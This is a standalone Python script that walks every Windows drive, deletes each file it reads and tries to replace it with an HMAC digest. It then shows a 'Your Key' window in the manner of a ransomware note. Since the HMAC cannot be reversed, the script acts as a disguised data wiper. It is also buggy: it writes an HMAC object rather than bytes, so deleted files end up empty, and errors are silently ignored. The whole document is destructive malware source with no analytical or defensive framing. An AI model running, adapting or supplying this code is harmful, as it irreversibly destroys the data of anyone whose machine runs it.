import os
import hmac
import hashlib
import subprocess
import tkinter


home_directory = os.path.expanduser("~")
hashed_key = os.urandom(32)

if os.name == "nt":
    drives = subprocess.check_output("wmic logicaldisk get name", shell=True, text=True).replace("\n", "").split()
    drives = [drive.strip() for drive in drives][1:]
    drives.remove(home_directory[0]+":")
    drives = [(drive + "\\") for drive in drives]
    drives.insert(0, home_directory)
#elif os.name == "posix": => Linux

for drive in drives:
    for root, dirs, files in os.walk(drive):
        if os.path.join(home_directory, "AppData") not in root:
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    with open(file_path, "rb") as f:
                        file_data = f.read()
            
                    hashed_data = hmac.new(hashed_key, file_data, hashlib.sha256)
                    os.remove(file_path)
                    with open(file_path, "wb") as f:
                        f.write(hashed_data)
                except:
                    pass
            

key_window = tkinter.Tk()
key_window.title("Hashed Key")
key_window.geometry("250x120")

window_label = tkinter.Label(key_window, text=f"Your Key : ")
window_label.pack(padx=10, pady=5)

key_label = tkinter.Label(key_window, text=hashed_key)
key_label.pack(padx=15, pady=5)

copy_button = tkinter.Button(key_window, text="Copy", command=lambda: os.system(f"powershell set-clipboard {hashed_key}"))
copy_button.pack(padx=10, pady=2)

key_window.mainloop()


